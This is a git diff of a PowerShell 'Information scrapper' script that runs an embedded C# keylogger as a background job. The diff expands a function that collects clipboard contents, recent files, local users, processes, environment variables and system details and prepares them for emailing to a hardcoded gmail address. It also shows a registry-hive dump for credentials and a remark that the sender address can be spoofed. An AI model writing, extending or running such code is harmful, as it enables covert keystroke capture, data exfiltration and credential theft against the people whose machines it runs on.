@@ -25,9 +25,9 @@ https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-lo
 
 function Main(){
 #initialize
-#nonAdministrativeScrapperFunctions
-#mail "test"
-### Runs Keylogger (does not require admin privs)
+#$results = nonAdministrativeScrapperFunctions
+#mail $results
+### Runs Key logger (does not require admin privs)
 keyLogger
 }
 
@@ -51,15 +51,15 @@ $smtpServer = "smtp.scarlet.be"
  $smtp.port = 25
  #Email structure 
  ### !!!! From email can be spoofed
- ### On 12/09/2018 you could still use any gmail account as sender and reciever (TESTED)
- $msg.From = "powershell@gmail.com"
+ ### On 12/09/2018 you could still use any gmail account as sender and receiver (TESTED)
+ $msg.From = "powershell@scarlet.be"
  $msg.To.Add("perselis.e@gmail.com")
 
  $msg.subject = "Scrapper information"
 
 
- $msg.IsBodyHTML = $true
- $msg.body = $messageBody +"<br /><br />"
+ $msg.IsBodyHTML = $false
+ $msg.body = $messageBody +""
 
  $ok=$true 
  Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
@@ -89,15 +89,18 @@ $host.ui.RawUI.WindowTitle = "Information scrapper"
 }
 
 function nonAdministrativeScrapperFunctions(){
-
+$results = "Start of non Administrative Scrapper Functions`n"
+$results += "`n`n"
 ### Get current date
-[System.DateTime]::Now
+$results += "`nCurrent Date `n"
+$results += [System.DateTime]::Now
+$results += "`n`n"
 # or
 # Get-Date
-
 ### Get execution policy to see if running a script is possible
-Get-ExecutionPolicy
-
+$results += "`nExecution policy`n"
+$results += Get-ExecutionPolicy 
+$results += "`n`n"
 
 <#
 NOT NEEDED, systeminfo GATHERS THIS INFORMATION
@@ -108,43 +111,73 @@ NOT NEEDED, systeminfo GATHERS THIS INFORMATION
 #>
 
 ### Detailed system info
-systeminfo
+$results += "`nDetailed system info `n"
+$results += systeminfo | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
+
+### Gets public ip
+$results += "`nPublic IP `n"
+$results += Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
+$results += "`n`n"
 
 ### Gets active tcp connections
-Get-NetTCPConnection
+$results += "`nActive TCP connections `n"
+$results += Get-NetTCPConnection | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
 
 ### Gets contents of clipboard
-Get-Clipboard
+$results += "`nClipboard content`n"
+$results += Get-Clipboard
+$results += "`n`n"
 
 ### Gets information of installation settings
-Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion
+$results += "`nInstallation settings info `n"
+$results += Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
 
 ### Detects if powershell is run as administrator
-[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+$results += "`nIs powershell run as admin? `n"
+$results += [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+$results += "`n`n"
 
 ### Lists recently opened files
-dir $HOME"\AppData\Roaming\Microsoft\Windows\Recent\"
+$results += "`nRecently opened files `n"
+$results += dir $HOME"\AppData\Roaming\Microsoft\Windows\Recent\" | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
 
-### Gets bios info (can be used to find out if a machine runs in a virtual environment)
-Get-WmiObject win32_bios
+### Gets BIOS info (can be used to find out if a machine runs in a virtual environment)
+$results += "`nBIOS info `n"
+$results += Get-WmiObject win32_bios | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
 
 ### Gets  name, status, SID, Lastlogon of all local users
-Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-List *
+$results += "`nLocal users info `n"
+$results += Get-LocalUser | Select-Object Name,Enabled,SID,Lastlogon | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
 
 ### Checks if computer is in domain
+$results += "`nIs computer in a domain?`n"
 if ((gwmi win32_computersystem).partofdomain -eq $true) {
-    write-host -fore green "I am domain joined!"
+    $results += "I am domain joined!"
 } else {
-    write-host -fore red "Ooops, workgroup!"
+    $results += "Ooops, workgroup!"
 }
+$results += "`n`n"
 
 ### Gets all running processes with details
-Get-Process
+$results += "`nAll running processes`n"
+$results +=  Get-Process | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
+
 ### Slow but more detailed alternative (not needed if results will be stored in variable)
 # Get-Process | format-list *
 
 ### Gets all environment variables
-Get-ChildItem env:
+$results += "`nEnvironment variables`n"
+$results +=  Get-ChildItem env: | Format-Table -HideTableHeaders | Out-String
+$results += "`n`n"
+
+$results
 }
 
 
@@ -158,8 +191,9 @@ reg save HKLM\SYSTEM .\system
 
 
 
-### Function that creates a powershell file 
-### with the keyloggers source in it and runs it in background
+### Function that creates a power shell file 
+### with the key loggers source in it and runs it in background
+### IF log file already exists, it appends results
 function keyLogger(){
 $scriptForKeyloggerAsString = 'Add-Type -TypeDefinition @"
 using System;
@@ -199,7 +233,7 @@ namespace KeyLogger {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
         int vkCode = Marshal.ReadInt32(lParam);
-        logFile.WriteLine((Keys)vkCode);
+        logFile.Write((Keys)vkCode);
       }
 
       return CallNextHookEx(hookId, nCode, wParam, lParam);
@@ -227,14 +261,14 @@ namespace KeyLogger {
 $command = '$scriptBlockVar ='+$scriptForKeyloggerAsString+'
  Invoke-Expression $scriptBlockVar'
 $scriptBlock = [scriptblock]::Create($command)
-### Starts scriptblock in background
+### Starts script block in background
 $job = start-Job -scriptblock $scriptBlock
 ### DEBUG
-$job | Format-List -Property *
-echo "akakakakak"
+#$job | Format-List -Property *
+#echo "akakakakak"
 }
 
-### Type definition is used for the keylogger and is called in main function
+### Type definition is used for the key logger and is called in main function
 ### command used for running block "[KeyLogger.Program]::Main();"
 
 
